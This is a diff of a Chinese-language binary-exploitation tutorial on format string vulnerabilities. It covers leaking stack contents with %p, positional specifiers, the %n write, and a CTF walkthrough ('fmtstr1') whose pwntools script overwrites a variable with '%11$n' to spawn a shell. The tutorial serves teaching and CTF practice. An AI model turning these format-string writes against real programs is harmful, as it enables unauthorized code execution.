@@ -1,6 +1,6 @@
 # pwn medium
 
-`更新时间：2025-3-26`
+`更新时间：2025-3-27`
 
 注释解释：
 
@@ -281,17 +281,19 @@ int main() {
 
 然后编译并运行程序
 
-> <img src="./img0/18.png">
+> <img src="./img0/22.png">
 
 可以看到，程序依然输出了一些内容，这些内容从何而来？
 
 现在我们来调试这个程序，注意需要编译为32位，因为64位通过寄存器传参
 
-在`main()`处断点，然后步过并输入`%x|%x|%x|%x`，在程序打印后查看栈
+在`main()`处断点，然后步过并输入`%p.%p.%p.%p`，在程序打印后查看栈
 
-> <img src="./img0/19.png">
+> <img src="./img0/21.png">
 
 图中可以看出，打印的内容正好是栈上存放的内容，也就是说，如果我们在格式化字符串后不提供任何参数，程序在调用`printf()`函数时，依然会依据格式化字符串的占位符，在栈上寻找相应的参数
+
+如上图中，`esp`存放的是`printf()`的第一个参数，`esp + 4`存放的也是`printf()`的第一个参数，即格式化字符串，`esp + 8`存放的是`printf()`的第二个参数，格式化字符串读取的第一参数`0x64`
 
 利用这个特性，如果栈上存在一些敏感信息，如`Canary`，`flag`等，就可以直接通过格式化字符串漏洞进行泄露
 
@@ -317,3 +319,98 @@ int main() {
 我们需要利用格式化字符串的另一种写法`X$`
 
 `X$`指的是格式化字符串可以指定此处显示的值的参数顺序，如`%3$d`，表示格式化后方的第三个整型参数。那么，上文所述的情况下，就能够传入`%20$p`或其他数值，来精确获取敏感内容
+
+**%n**
+
+在C语言格式化字符串的占位符中，存在一个占位符`%n`，其意义是获取已打印字符的个数，并赋值给对应的参数，参数必须是一个地址，否则程序运行时会报错
+
+```c
+#include <stdio.h>
+
+int main() {
+	int a, b;
+
+    printf("This is a%n example!%n\n", &a, &b);
+    printf("a = %d\nb = %d\n", a, b);
+
+    return 0;
+}
+```
+
+运行结果
+
+> <img src="./img0/20.png">
+
+在上文中我们知道，在不指定第二参数的情况下，`printf()`会将栈上的内容作为第二参数依次读取，如果此时我们将格式化字符串写为一个地址，并使用`%n`为其写入数据，理论上就能实现在栈上的任意位置写入数据
+
+### fmtstr1
+
+先进行反编译
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[80]; // [esp+2Ch] [ebp-5Ch] BYREF
+  unsigned int v5; // [esp+7Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  be_nice_to_people();
+  memset(buf, 0, sizeof(buf));
+  read(0, buf, 0x50u);
+  printf(buf);
+  printf("%d!\n", x);
+  if ( x == 4 )
+  {
+    puts("running sh...");
+    system("/bin/sh");
+  }
+  return 0;
+}
+```
+
+第15行直接调用了`shell`，其调用条件是变量`x == 4`，而又因为存在`printf(buf)`，所以这道题很明显存在格式化字符串漏洞，只需要通过`printf(buf)`将变量`x`的值改为4即可
+
+先确认变量`x`的位置
+
+> <img src="./img0/23.png">
+
+变量`x`位于`.data`段上，默认值是3
+
+然后进行动态调试，计算`printf()`与`buf`之间的距离
+
+> <img src="./img0/24.png">
+
+如图，`esp`是`printf()`的格式化字符串位置，`esp + 4`是其拷贝，`ebx`是`buf`的位置，中间距离11个字长，所以如果我们想要更改x的值，首先需要传入x的地址，此时x的地址就会存放在`ebx`的位置，然后拼接一个`%11$n`来让`printf()`的格式化字符串寻找第11个参数，即x的地址，然后为其赋值
+
+构造攻击脚本
+
+```py
+from pwn import *
+
+sh = process('./fmtstr1')
+# 本题需要让x的值等于4，而x的地址本身就是四字节，因此直接拼接即可
+payload = p32(0x804a02c) + b'%11$n'
+sh.sendline(payload)
+sh.interactive()
+```
+
+此时的栈结构为
+
+| stack addr | content                 |
+| ---------- | ----------------------- |
+| 0xffffcef0 | &p32(x addr) + b'%11$n' |
+| 0xffffcef4 | &p32(x addr) + b'%11$n' |
+| 0xffffcef8 | 0x50                    |
+| 0xffffcefc | 1                       |
+| 0xffffcf00 | 0                       |
+| 0xffffcf04 | 1                       |
+| 0xffffcf08 | &0                      |
+| 0xffffcf0c | &0x6d6f682f             |
+| 0xffffcf10 | 0                       |
+| 0xffffcf14 | &0x5b94e1bb             |
+| 0xffffcf18 | 0x1a                    |
+| 0xffffcf1c | x addr                  |
+
+执行脚本，成功`getshell`
+
+> <img src="./img0/25.png">
